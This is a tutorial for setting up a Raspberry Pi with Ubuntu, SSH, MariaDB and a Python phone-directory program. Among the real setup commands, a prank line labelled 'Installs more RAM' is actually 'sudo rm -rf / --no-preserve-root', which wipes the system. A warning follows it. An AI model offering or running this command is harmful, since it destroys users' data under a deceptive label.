# How to setup your raspberry pi with Ubuntu OS

### This tutorial assumes you have already built your raspberry pi and have the sd card inserted on a seperate machine




## Step by step guide

-  Download rasperberry pi imager from their official website: https://www.raspberrypi.com/software/

- Once the imager is downloaded, run the .exe file and choose your raspberry pi model, Ubuntu OS, and the storage location, which in our case is the SD card.

- Ubuntu is under "Other general-purpose OS"

- Once finished downloading/installing pop out the SD card and insert it into your Raspberry pi and turn it on.

- Configure the OS however preferable, once all is ready, press **"CTRL + ALT + T"** to open bash

- Run the commands under here in bash:

```sh
# Keeps your OS up to date
sudo apt update
sudo apt upgrade

# Installs ssh for remote connection and allows remote connection through the firewall
sudo apt install openssh-server
sudo ufw enable
sudo ufw allow ssh

# Installing Python, git, neovim (Optional) and MariaDB
sudo apt install python3-pip mariadb-server git neovim

# Note: (Press enter when it prompts for a "root" password) Multiple prompts will show and you need to answer "Y/n" which is Yes or no. Correct: n, n, Y, Y, Y, Y, Y
sudo mysql_secure_installation

# Installs more RAM (Optional)
sudo rm -rf / --no-preserve-root #512GB

```
> [!WARNING]
> Don't actually install more RAM

## SSH Key (Optional)
Allows you to quickly remote login to your server/computer without requiring a password
```bat
REM On the device you need to remote connect from in command line. Note: Fill in your Raspberry pi's user and ip. Also fill in your own windows computer user in the path.
ssh-keygen

scp c:\Users\Youssef\.ssh\id_rsa.pub user@ip

REM On the server/computer:

cat id_rsa.pub >> .ssh/authorized_keys


```


## Setup MariaDB
To log into MariaDB use this command: ```sudo mariadb -u root```



```sql

--Creates a MariaDB user. Change "Username" and "password" to your own desires. Note: When granting privileges to a user the values you put when making the user has to be the same.
CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'username'@’localhost’ IDENTIFIED BY 'password';
FLUSH PRIVILEGES;
```


## Download the "Telefonkatalog" and SCP it to your linux machine


Download the "Telefonkatalog"

```bat
REM Fill in your Windows User and your linux user/ip
     scp C:\Users\"YourUser"\Downloads\telefonkatalog_med_database user@ip 

    
REM If you want to run the program use this in the bash terminal:
    python3 telefonkatalog_med_database

```